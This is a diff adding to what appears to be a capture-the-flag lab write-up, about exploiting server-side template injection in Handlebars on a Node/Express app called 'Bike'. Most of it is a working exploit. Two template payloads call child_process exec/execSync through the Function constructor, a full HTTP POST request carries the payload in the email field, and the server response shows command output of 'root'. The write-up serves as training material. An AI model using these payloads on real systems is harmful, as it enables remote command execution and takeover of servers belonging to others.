@@ -104,5 +104,175 @@ decode:
 9	"    at Array.<anonymous> (/root/Backend/node_modules/handlebars/dist/cjs/handlebars/helpers/with.js:22:14)"
 10	"    at eval (eval at createFunctionContext (/root/Backend/node_modules/handlebars/dist/cjs/handlebars/compiler/javascript-compiler.js:254:23), <anonymous>:12:34)"
 ```
+
+testings if process main module works
+```
+{{#with "s" as |string|}}
+  {{#with "e"}}
+    {{#with split as |conslist|}}
+      {{this.pop}}
+      {{this.push (lookup string.sub "constructor")}}
+      {{this.pop}}
+      {{#with string.split as |codelist|}}
+        {{this.pop}}
+        {{this.push "return require('child_process').exec('whoami');"}}
+        {{this.pop}}
+        {{#each conslist}}
+          {{#with (string.sub.apply 0 codelist)}}
+            {{this}}
+          {{/with}}
+        {{/each}}
+      {{/with}}
+    {{/with}}
+  {{/with}}
+{{/with}}
+```
+
+it does!.
+
+trying to post with whoami command to see user.
+
+```
+POST / HTTP/1.1
+
+Host: 10.129.75.240
+
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0
+
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
+
+Accept-Language: en-US,en;q=0.5
+
+Accept-Encoding: gzip, deflate
+
+Content-Type: application/x-www-form-urlencoded
+
+Content-Length: 600
+
+Origin: http://10.129.75.240
+
+Connection: close
+
+Referer: http://10.129.75.240/
+
+Upgrade-Insecure-Requests: 1
+
+
+
+email={{#with "s" as |string|}}
+
+  {{#with "e"}}
+
+    {{#with split as |conslist|}}
+
+      {{this.pop}}
+
+      {{this.push (lookup string.sub "constructor")}}
+
+      {{this.pop}}
+
+      {{#with string.split as |codelist|}}
+
+        {{this.pop}}
+
+        {{this.push "return global.process.mainModule.constructor._load('child_process').execSync('whoami').toString()"}}
+
+        {{this.pop}}
+
+        {{#each conslist}}
+
+          {{#with (string.sub.apply 0 codelist)}}
+
+            {{this}}
+
+          {{/with}}
+
+        {{/each}}
+
+      {{/with}}
+
+    {{/with}}
+
+  {{/with}}
+
+{{/with}}&action=Submit
+```
+
+respond:
+
+```
+HTTP/1.1 200 OK
+
+X-Powered-By: Express
+
+Content-Type: text/html; charset=utf-8
+
+Content-Length: 1233
+
+ETag: W/"4d1-Y2dTfLXUh5thexkFfxULykQ7sjw"
+
+Date: Sun, 27 Nov 2022 17:42:21 GMT
+
+Connection: close
+
+
+
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <meta http-equiv="X-UA-Compatible" content="ie=edge">
+    <link rel="stylesheet" href="css/home.css">
+    <title> Bike </title>
+</head>
+<header>
+
+</header>
+
+<body>
+    <div id=container>
+  <img
+    src="images/buttons.gif"
+    id="avatar">
+  <div class="type-wrap">
+    <span id="typed" style="white-space:pre;" class="typed"></span>
+  </div>
+</div>
+<div id="contact">
+    <h3>We can let you know once we are up and running.</h3>
+    <div class="fields">
+      <form id="form" method="POST" action="/">
+        <input name="email" placeholder="E-mail"></input>
+        <button type="submit" class="button-54" name="action" value="Submit">Submit</button>
+      </form>
+    </div>
+    <p class="result">
+        We will contact you at:       e
+
+      2
+
+      [object Object]
+
+        function Function() { [native code] }
+
+        2
+
+        [object Object]
+
+            root
+
+
+
+    </p>
+</div>
+    <script src="https://ajax.googleapis.com/ajax/libs/jquery/2.2.4/jquery.min.js"></script>
+    <script src="js/typed.min.js"></script>
+    <script src="js/main.js"></script>
+</body>
+
+</html>
+```
  
  
